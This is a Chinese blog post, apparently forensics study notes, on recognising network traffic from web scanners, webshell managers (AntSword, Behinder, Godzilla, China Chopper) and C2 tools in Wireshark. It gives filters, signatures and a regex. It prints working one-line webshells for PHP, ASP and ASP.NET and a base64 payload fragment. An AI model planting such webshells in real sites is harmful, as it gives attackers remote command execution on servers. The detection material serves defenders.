@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="light">
+  <head>
+    
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>webshell管理工具的流量特征分析 | JerryXie&#39;s Blog</title>
+<meta name="description" content="CTF, digital forensics, offensive security, and study notes.">
+<meta name="theme-color" content="#f5f5f7">
+<meta name="referrer" content="no-referrer">
+<meta property="og:type" content="article">
+<meta property="og:title" content="webshell管理工具的流量特征分析 | JerryXie&#39;s Blog">
+<meta property="og:description" content="CTF, digital forensics, offensive security, and study notes.">
+
+  <meta property="og:url" content="https://jerryxie.top/notes/电子取证/流量包专题/webshell管理工具的流量特征分析/">
+  <link rel="canonical" href="https://jerryxie.top/notes/电子取证/流量包专题/webshell管理工具的流量特征分析/">
+
+
+  <meta name="author" content="JerryXie">
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="/js/main.js"></script>
+
+  <meta name="generator" content="Hexo 8.1.1"></head>
+  <body>
+    <div class="scroll-progress" data-scroll-progress></div>
+    <div class="site-shell">
+      
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="/">
+      <span class="brand-mark"></span>
+      <span class="brand-name">JerryXie&#39;s Blog</span>
+    </a>
+
+    <button class="menu-toggle" type="button" data-menu-toggle aria-label="Toggle navigation">
+      <span></span><span></span><span></span>
+    </button>
+
+    <nav class="site-nav" data-menu-panel>
+      
+        <a href="/" class="">Home</a>
+      
+        <a href="/archives/" class="">Archive</a>
+      
+        <a href="/categories/" class="">Library</a>
+      
+        <a href="/about/" class="">About</a>
+      
+    </nav>
+
+    <button class="theme-toggle" type="button" data-theme-toggle aria-label="Toggle theme">
+      <span data-theme-icon>Dark</span>
+    </button>
+  </div>
+</header>
+
+      <main class="page-shell">
+        
+
+<article class="article-layout">
+  <div class="article-main card-panel">
+    <a class="back-link" href="/categories/">Back to library</a>
+    <header class="article-header">
+      <div class="article-badges">
+        
+          
+            <a class="category-chip" href="/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">电子取证</a>
+          
+            <a class="category-chip" href="/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%8C%85%E4%B8%93%E9%A2%98/">流量包专题</a>
+          
+        
+      </div>
+      <h1>webshell管理工具的流量特征分析</h1>
+      <div class="article-meta">
+        <span>Published 2026-04-19</span>
+        <span>Updated 2026-04-19</span>
+        <span>18 min</span>
+      </div>
+      
+        <p class="article-source">Source path: <code>电子取证/流量包专题/webshell管理工具的流量特征分析.md</code></p>
+      
+    </header>
+
+    <div class="article-content">
+      <p>来源：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU2NDY2OTU4Nw==&mid=2247510604&idx=1&sn=5ef62b3c4355918be565fbfad20e83b4&poc_token=HAkYH2mjaGhC5X8w6utMK1JkA2U181gjuI1-hD-6">https://mp.weixin.qq.com/s?__biz&#x3D;MzU2NDY2OTU4Nw&#x3D;&#x3D;&amp;mid&#x3D;2247510604&amp;idx&#x3D;1&amp;sn&#x3D;5ef62b3c4355918be565fbfad20e83b4&amp;poc_token&#x3D;HAkYH2mjaGhC5X8w6utMK1JkA2U181gjuI1-hD-6</a></p>
+<h1 id="恶意流量分析"><a href="#恶意流量分析" class="headerlink" title="恶意流量分析"></a><em><strong>恶意流量分析</strong></em></h1><h2 id="1-网站流量特征分析"><a href="#1-网站流量特征分析" class="headerlink" title="1. 网站流量特征分析"></a>1. 网站流量特征分析</h2><p>主要分析请求url，user-agent，请求参数等</p>
+<h3 id="（1）dirsearch"><a href="#（1）dirsearch" class="headerlink" title="（1）dirsearch"></a>（1）dirsearch</h3><ul>
+<li><p>介绍：dirsearch是一个基于Python的命令行工具，用于对web服务器中的目录和文件进行暴力破解。它通过多线程的方式进行暴力扫描，支持保持连接、多种后缀、生成报告（纯文本、JSON）、启发式检测无效的网页、递归的暴力扫描、支持HTTP代理、用户代理随机化、批量处理、请求延迟等功能特点。</p>
+</li>
+<li><p>主要作用：dirsearch可以用来发现web服务器中的目录和文件，并尝试通过猜测文件名或目录名来获取敏感信息。它可以帮助网络安全专业人员或黑客攻击者进行安全漏洞扫描和攻击。</p>
+</li>
+<li><p>主要特征：通过显示过滤器,过滤 http.request数据流，可以在数据流中看到大量http GET请求再对路径以及文件进行爆破，可以发现在info中的路径有很明显的顺序,例如dir将a开头的路径跑完后就开始跑b开头的路径如此反复,所以在遇到有类似特征的流量，可以初步判断为dirsearch攻击。  </p>
+</li>
+<li><p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645512779-d7e6a299-a5c6-4baf-a29b-39152b00cebe.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+</li>
+</ul>
+<h3 id="2-sqlmap"><a href="#2-sqlmap" class="headerlink" title="(2) sqlmap"></a>(2) sqlmap</h3><ul>
+<li>介绍：SQLMap是一款开源的自动化SQL注入工具，由Python写成。它主要功能是扫描、发现并利用给定的URL和SQL注入漏洞。其广泛的功能和选项包括数据库指纹、枚举、数据库提权、访问目标文件系统，并在获取操作权限时执行任意命令。SQLMap完全支持MySQL、Oracle、PostgreSQL、MSSQL、Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。</li>
+<li>主要特征：依然是通过wireshark的显示过滤器过滤sqlmap攻击流量包 过滤 http.request后，可以发现info中有大量的sql语句。</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645513055-f4999f1b-3d0a-4b09-b2a2-4a9120a03acd.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>如果攻击者没有设置sqlmap工具，在传输层的请求头中的user-agent可以看到sqlmap的网站，这是一个强特征，只要有这个特征就可以断定是sqlmap</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645512891-20f662db-3192-4ea1-8ac4-31421aabb901.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>如果需要过滤sqlmap的数据流 使用 http.user_agent contains sqlmap 可以将包含sql的数据流过滤出来，进行下一步分析。</li>
+</ul>
+<h2 id="2-漏洞扫描器流量特征分析"><a href="#2-漏洞扫描器流量特征分析" class="headerlink" title="2.漏洞扫描器流量特征分析"></a>2.漏洞扫描器流量特征分析</h2><h3 id="（1）AWVS"><a href="#（1）AWVS" class="headerlink" title="（1）AWVS"></a>（1）AWVS</h3><ul>
+<li>介绍：一个用于测试和管理Web应用程序安全性的平台。它能够自动扫描互联网或者本地局域网中是否存在漏洞，并报告漏洞。AWVS可以扫描任何通过Web浏览器访问和遵循HTTP&#x2F;HTTPS规则的Web站点，适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的Web网站。AWVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。</li>
+<li>特征：参数、ua、content_type 中含有 test、testing、wvs、acunetix_wvs_security_test、acunetix，acunetix_wvs，其中主要是 test、testing比较常见。<br>使用显示过滤器，过滤awvs攻击流量包</li>
+</ul>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.content_type contains &quot;test（替换上述特征）&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现在http传输层协议中，POST请求下属的Content_type包含testing</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1763645512748-41e035d4-4a7b-494c-99e0-efa04e496c64.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>或者使用</li>
+</ul>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.uri.query.parameter contains &quot;test&quot;</span><br></pre></td></tr></table></figure>
+
+<p>过滤后，可以在post info 请求中看到 name&#x3D;testingXXXX的特征信息</p>
+<h3 id="（2）namp"><a href="#（2）namp" class="headerlink" title="（2）namp"></a>（2）namp</h3><ul>
+<li>介绍：Nmap是一款针对大型网络的端口扫描工具，它最初设计目的是为了快速扫描大型网络。Nmap支持多种协议的扫描，如UDP、TCP、ICMP等，同时支持性能和可靠性统计，例如动态延时计算、数据包超时和转发、并行端口扫描、通过并行ping侦测下层主机等功能。</li>
+<li>主要特征：使用显示过滤器过滤namp流量包</li>
+</ul>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp &amp;&amp; ip.dst == [namp扫描的ip]</span><br></pre></td></tr></table></figure>
+
+<p>可以发现有大量的tcp包 在对目标ip进行端口访问</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645513102-3637a1af-bdda-4360-8609-091af446e355.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<h2 id="3-webshell管理工具流量特征分析"><a href="#3-webshell管理工具流量特征分析" class="headerlink" title="3.webshell管理工具流量特征分析"></a>3.webshell管理工具流量特征分析</h2><h3 id="（1）蚁剑"><a href="#（1）蚁剑" class="headerlink" title="（1）蚁剑"></a>（1）蚁剑</h3><ul>
+<li>介绍：蚁剑（AntSword）是一款开源的跨平台WebShell管理工具，主要面向合法授权的渗透测试安全人员以及进行常规操作的网站管理员。它推崇模块化的开发思想，遵循开源，致力于为不同层次的人群提供最简单易懂、方便直接的代码展示及其修改说明。</li>
+<li>主要特征：蚁剑是明文传输（即使使用了加密与编码，也会有包传输密码协商过程，该过程也会有明文存在）即：在post包中的html可以看到传入的参数 观察多个POST包中可以发现html下属的form item都有一个display_errors</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645514385-6fd86ca1-1215-4450-a405-8f415dcb38ce.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>右键，选择作为过滤器应用中选中</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645514388-8c47474e-8bb2-4dfa-bed1-dab2a0af6588.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>将显示过滤器中多余的信息删去，只留下 urlencoded-form.value contains “display_errors”</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645514686-fd68b17f-54e9-47f8-a908-f8d8f1e0d2ce.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>然后在追踪http 通过url解密，就可以实现分析攻击者的操作，溯源等操作</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645514590-cd25497b-08bb-4faf-af39-f142008bdf70.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<h3 id="（2）冰蝎"><a href="#（2）冰蝎" class="headerlink" title="（2）冰蝎"></a>（2）冰蝎</h3><ul>
+<li>介绍：“冰蝎”是一个动态二进制加密的网站管理客户端，基于JAVA开发，能够跨平台使用。最新版本为v2.0.1，兼容性较之前的版本有较大提升。它的主要功能包括基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等，非常强大。</li>
+<li>主要特征：冰蝎2.0，3.0，4.0版本之间各有差异<br>例如4.0的特征：<br>在4.0更新的源代码中，定义了14个user-agent</li>
+</ul>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36&quot;,</span><br><span class="line">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0&quot;,</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;,</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55&quot;,</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;,</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0&quot;,</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/84.0.4147.125 Safari/537.36&quot;,</span><br><span class="line">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/84.0.4147.125 Safari/537.36&quot;,</span><br><span class="line">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0&quot;,</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;</span><br></pre></td></tr></table></figure>
+
+<p>大多数情况为第一个<br>1.观察冰蝎攻击流量包的POST请求包，可以在user-agent中看到上诉特征</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645515653-a0653c7f-395c-469a-82e7-46f951d0299c.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>如果需要拦截这个攻击，可以在防火墙中拦截Chrome&#x2F;89.0.4389.114 这个版本的流量 因为现在chrome更新到100.xx的版本了 只要攻击者或者极少用户使用，影响不大</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645515419-7f144e0a-eb6f-4328-9e8a-64df8324d4e6.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>2.请求体头部字节与响应头部字节不会变化</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1763645516381-7b421524-2bf6-4152-a2fc-8ee3df151cc4.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645516008-cf14f994-660c-43a0-9843-0f26dcd8efd7.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>可以发现他们请求体中的key值开头一直不变 这是在实际情况是不可能的 所以在看到此特征的流量可以直接判断为冰蝎。</p>
+<h3 id="（3）哥斯拉"><a href="#（3）哥斯拉" class="headerlink" title="（3）哥斯拉"></a>（3）哥斯拉</h3><ul>
+<li>介绍:哥斯拉是一款由Java语言开发的webshell权限管理工具，功能强大，能绕过市面大部分的静态查杀和流量加密，不受大部分的流量Waf限制，自带的插件冰蝎和蚁剑无法比拟。它不仅可以实现传统的命令执行、文件管理、数据库管理等功能，还可以进行MSF联动、绕过OpenBasedir、ZIP压缩和解压、代码执行、绕过DisableFunctions等操作。</li>
+<li>主要特征：哥斯拉客户端与 shell 建连初期的三个固定行为特征，且顺序出现在同一个 TCP 连接中。可以总结为：<br>特征：发送一段固定代码（payload），http 响应为空<br>特征：发送一段固定代码（test），执行结果为固定内容<br>特征：发送一段固定代码（getBacisInfo）<br>先发送一段pass的加密密文</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1763645655095-ab888354-f2ff-4a83-95c7-5ac22703d528.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>然后目标服务器会返回一串空回复</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1763645660958-7beb0901-7637-4465-b744-3a98381ba908.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>在通过交互2次 返回固定值 密文</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1763645517696-eb2166a5-7c6d-42c3-8e16-fdd2fe8e9d01.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>哥斯拉的响应体中有一个特征是前16位和后16为会组成一个32位md5 正则匹配类似于(?i:[0-9A-F]{16})[\w+&#x2F;]{4,}&#x3D;?&#x3D;?(?i:[0-9A-F]{16})<br>可以在返回包中的密文发现 前16和后16为一个32位的MD5值</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645517473-3fb1149d-c8db-4cc4-b664-f8f4b335606e.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<h3 id="（4）菜刀"><a href="#（4）菜刀" class="headerlink" title="（4）菜刀"></a>（4）菜刀</h3><p>中国菜刀<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90&spm=1001.2101.3001.7020">流量分析</a></p>
+<p>payload特征：<br>PHP: <?php @eval($_POST['caidao']);?></p>
+<p>ASP: &lt;%eval request(“caidao”)%&gt;</p>
+<p>ASP.NET: &lt;%@ Page<br>Language&#x3D;“Jscript”%&gt;&lt;%eval(Request.Item[“caidao”],“unsafe”);%&gt;</p>
+<p>数据包流量特征：<br>1，请求包中：ua头为百度，火狐<br>2，请求体中存在eavl，base64等特征字符<br>3，请求体中传递的payload为base64编码，并且存在固定的QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J<br><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1763645821740-a498077c-48e8-4ff7-afdb-a9e43a490b4d.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<h2 id="4-常见C2远控服务器流量特征分析"><a href="#4-常见C2远控服务器流量特征分析" class="headerlink" title="4.常见C2远控服务器流量特征分析"></a>4.常见C2远控服务器流量特征分析</h2><h3 id="1-metasploit"><a href="#1-metasploit" class="headerlink" title="(1) metasploit"></a>(1) metasploit</h3><ul>
+<li>介绍：Metasploit是一款开源的网络安全评估工具，它被广泛用于发现、验证和利用网络漏洞。这个工具是由Rapid7开发的，包括Metasploit Pro、Metasploit Express和Metasploit Community Edition等版本。</li>
+<li>主要特征：meterpreter命令执行的过程已经进行了加密处理，继续进行活动，防御者也不会发现有价值的数据，但可以观察到每个数据都包含MZ标头和DOS模式异常。<br>metasploit是使用tcp协议，使用显示过滤器，过滤metasploit流量包</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645517679-59dfe828-e3b7-4d1e-b06a-f4cc9dc8672e.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>可以发现有2个端口一直在交互 9999和57591 可以初步判断这个为远控后门，追踪下tcp的数据流，发现有明显特征</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1763645517668-0169eacf-1ba2-442c-bbe1-5df90e2c4444.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>连续追踪多个tcp包都有这个特征，所以当我们遇到该特征的流量，可以判断为metasploit流量。</li>
+</ul>
+<h3 id="（2）cobaltstrike"><a href="#（2）cobaltstrike" class="headerlink" title="（2）cobaltstrike"></a>（2）cobaltstrike</h3><ul>
+<li>介绍：Cobalt Strike提供了一套功能强大的工具和框架，用于模拟网络攻击、横向移动、特权升级、持久化访问以及命令和控制等任务。它旨在帮助安全专业人员评估和改善组织的网络防御能力，同时提供了完整的红队操作平台。Cobalt Strike的核心功能包括木马部署与远控、模拟攻击、内网渗透和横向移动、网络侦察、命令和控制以及报告和日志记录。</li>
+<li>主要特征：<br>(1）cs使用的http协议 cs流量包的第一个GET请求 有一个随机编码 IPYK转换为ascii 之和与 256 取余计算值等于 92 ，下载stage payload的过程uri符合 checksum8 规则，即：路径的 ascii 之和与 256 取余计算值等于 92</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/webp/54208227/1763645518978-fac74400-6fca-4193-905f-1ecfb04e79e7.webp" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>(2) c2服务器如果没有任务下发，会有规律的请求响应间隔，用于维持连接，比如这里是每间隔3s，发一次包（间隔时间可以在cs内设置） 有些响应在4s，是因为网络有延迟不影响</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1763645518646-bf02aa0f-d1d5-499a-8a8d-c72eb6ad96e9.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<ul>
+<li>如果cs服务器有任务下发，则会加密放在http心跳包的cookie里面，下发后，靶机完成指令，也同样会返回一个post包都加密并隐藏在cookie中。</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上为根据课程等总结，大多都是在POST和GET请求中，还有很多流量特征需要大家发现，大家可以讨论讨论，如有错误或者更好的方法，请指出。</p>
+<h1 id="WebShell客户端流量特征"><a href="#WebShell客户端流量特征" class="headerlink" title="WebShell客户端流量特征"></a>WebShell客户端流量特征</h1><p>转载：</p>
+<p><a target="_blank" rel="noopener" href="https://joker-vip.github.io/2021/05/18/Webshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/">WebShell客户端流量特征</a></p>
+<p>WebShell客户端是一种用于服务器上WebShell后门与攻击客户端之间进行通信的程序，通常可以根据WebShell客户端的流量来判断服务器上是否存在WebShell后门。</p>
+<h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><p>中国菜刀自诞生以来已经历了多个版本的更新，其功能、隐秘性也随着更新得到很大提升。菜刀现在主流有三个版本在使用，分别为2011版、2014版、2016版，这三个版本中从2011版本到2014版本是功能性上进行了增强，从2014版本到2016版本是在隐秘性上进行了增强，2016版本的菜刀流量加入了混淆，使其链接流量更具有混淆性。</p>
+<p>中国菜刀基本支持PHP、JSP、ASP这三种WebShell的连接，这三种语言所对应的流量各有差异，各个版本也有不用。下面将按照不同版本不同语言组合进行分析。其中2011版和2014版菜刀流量特征基本一致，所以放在一起分析。</p>
+<h3 id="中国菜刀2011版本及2014版本各语言WebShell链接流量特征"><a href="#中国菜刀2011版本及2014版本各语言WebShell链接流量特征" class="headerlink" title="中国菜刀2011版本及2014版本各语言WebShell链接流量特征"></a>中国菜刀2011版本及2014版本各语言WebShell链接流量特征</h3><h4 id="1-PHP类WebShell链接流量"><a href="#1-PHP类WebShell链接流量" class="headerlink" title="(1)PHP类WebShell链接流量"></a>(1)PHP类WebShell链接流量</h4><p>其中特征主要在body中，将body中流量进行url解码后如下：</p>
+<p>其中特征点有如下三部分，</p>
+<p>第一：“eval”，eval函数用于执行传递的攻击payload，这是必不可少的；</p>
+<p>第二：(base64_decode($_POST[z0]))，(base64_decode($_POST[z0]))将攻击payload进行Base64解码，因为菜刀默认是将攻击载荷使用Base64编码，以避免被检测；</p>
+<p>第三：&amp;z0&#x3D;QGluaV9zZXQ…，该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文。</p>
+<p>注：</p>
+<p>1.有少数时候eval方法会被assert方法替代。</p>
+<p>2.$_POST也会被$_GET、$_REQUEST替代。</p>
+<p>3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。</p>
+<h4 id="2-JSP类WebShell链接流量："><a href="#2-JSP类WebShell链接流量：" class="headerlink" title="(2)JSP类WebShell链接流量："></a>(2)JSP类WebShell链接流量：</h4><p>该流量是WebShell链接流量的第一段链接流量，其中特征主要在i&#x3D;A&amp;z0&#x3D;GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i&#x3D;A，第二个参数指定编码，其参数值为编码，如z0&#x3D;GB2312，有时候z0后面还会接着又z1&#x3D;参数用来加入攻击载荷。</p>
+<p>注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。</p>
+<h4 id="3-ASP类WebShell链接流量："><a href="#3-ASP类WebShell链接流量：" class="headerlink" title="(3)ASP类WebShell链接流量："></a>(3)ASP类WebShell链接流量：</h4><p>其中body流量进行URL解码后</p>
+<p>其中特征点有如下三部分，</p>
+<p>第一：“Execute”，Execute函数用于执行传递的攻击payload，这是必不可少的，这个等同于php类中eval函数；</p>
+<p>第二：OnError ResumeNext，这部分是大部分ASP客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码。</p>
+<p>第三：Response.Write和Response.End是必有的，是来完善整个操作的。</p>
+<p>这种流量主要识别这几部分特征，在正常流量中基本没有。</p>
+<p>注：OnError Resume Next这个特征在大部分流量中存在，极少数情况没有。</p>
+<h3 id="中国菜刀2016版本各语言WebShell链接流量特征"><a href="#中国菜刀2016版本各语言WebShell链接流量特征" class="headerlink" title="中国菜刀2016版本各语言WebShell链接流量特征"></a>中国菜刀2016版本各语言WebShell链接流量特征</h3><h4 id="1-PHP类WebShell链接流量-1"><a href="#1-PHP类WebShell链接流量-1" class="headerlink" title="(1)PHP类WebShell链接流量"></a>(1)PHP类WebShell链接流量</h4><p>其中特征主要在body中，将body中部分如下：</p>
+<p>这个版本中流量最大的改变就是将特征进行打断混淆，这也给我们识别特征提供一种思路。</p>
+<p>其中特征点有如下三部分，</p>
+<p>第一：“”Ba”.”SE6”.”4_dEc”.”OdE”，这部分是将base64解码打断使用.来连接。</p>
+<p>第二：@ev”.”al，这部分也是将@eval这部分进行打断连接，可以识别这段代码即可。</p>
+<p>第三：QGluaV9zZXQoImRpc3BsYXlf…，该部分是传递攻击payload，payload依旧使用Base64编码的，所以可以利用base64解码可以看到攻击明文来识别。</p>
+<p>注：1.有少数时候eval方法会被assert方法替代。</p>
+<h4 id="2-JSP类WebShell链接流量：-1"><a href="#2-JSP类WebShell链接流量：-1" class="headerlink" title="(2)JSP类WebShell链接流量："></a>(2)JSP类WebShell链接流量：</h4><p>该版本JSPwebshell流量与之前版本一样，</p>
+<p>所以分析如上：该流量是WebShell链接流量的第一段链接流量，其中特征主要在i&#x3D;A&amp;z0&#x3D;GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i&#x3D;A，第二个参数指定编码，其参数值为编码，如z0&#x3D;GB2312，有时候z0后面还会接着又z1&#x3D;、z2&#x3D;参数用来加入攻击载荷。</p>
+<p>注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。</p>
+<h4 id="3-ASP类WebShell链接流量：-1"><a href="#3-ASP类WebShell链接流量：-1" class="headerlink" title="(3)ASP类WebShell链接流量："></a>(3)ASP类WebShell链接流量：</h4><p>其中body流量为：</p>
+<p>2016版本流量这链接流量最大的变化在于body中部分字符被unicode编码替换混淆，所以这种特征需要提取出一种形式来，匹配这个混淆特征，比如“字符+%u0000+字符+%u0000”这种形式来判断该流量。</p>
+<p>或者直接将这部分代码直接进行unicode解码，可以获取到如2011或2014版本的asp所示的流量。可以根据上一段特征来进行判断。</p>
+<p>这种流量主要识别这几部分特征，在正常流量中基本没有。</p>
+<h2 id="中国蚁剑-AntSword"><a href="#中国蚁剑-AntSword" class="headerlink" title="中国蚁剑(AntSword)"></a>中国蚁剑(AntSword)</h2><p>蚁剑的很多代码源于中国菜刀，所以他的链接流量与中国菜刀很相似，但是蚁剑可以扩充性很好，可以对进行加密、混淆等绕过处理。蚁剑默认支持ASP以及PHP的webshell链接。</p>
+<h3 id="蚁剑PHP类WebShell链接流量"><a href="#蚁剑PHP类WebShell链接流量" class="headerlink" title="蚁剑PHP类WebShell链接流量"></a>蚁剑PHP类WebShell链接流量</h3><p>其中body流量进行URL解码后为：</p>
+<p>其中流量最中明显的特征为@ini_set(“display_errors”,”0”);这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文，所以较好发现。</p>
+<h3 id="蚁剑ASP类WebShell链接流量"><a href="#蚁剑ASP类WebShell链接流量" class="headerlink" title="蚁剑ASP类WebShell链接流量"></a>蚁剑ASP类WebShell链接流量</h3><p>其中body流量进行URL解码后为：</p>
+<p>我们可以看出蚁剑针对ASP类的WebShell流量与菜刀的流量很像，其中特征也是相同，如OnError ResumeNext、Response.End、Response.Write，其中execute在蚁剑中被打断混淆了，变成了拼接形式Ex”&amp;cHr(101)&amp;”cute，同时该流量中也使用了eval参数，可以被认为明显特征。</p>
+<h3 id="蚁剑绕过特征流量"><a href="#蚁剑绕过特征流量" class="headerlink" title="蚁剑绕过特征流量"></a>蚁剑绕过特征流量</h3><p>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x……&#x3D;”这种形式（下划线可替换为其他）</p>
+<p>所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。</p>
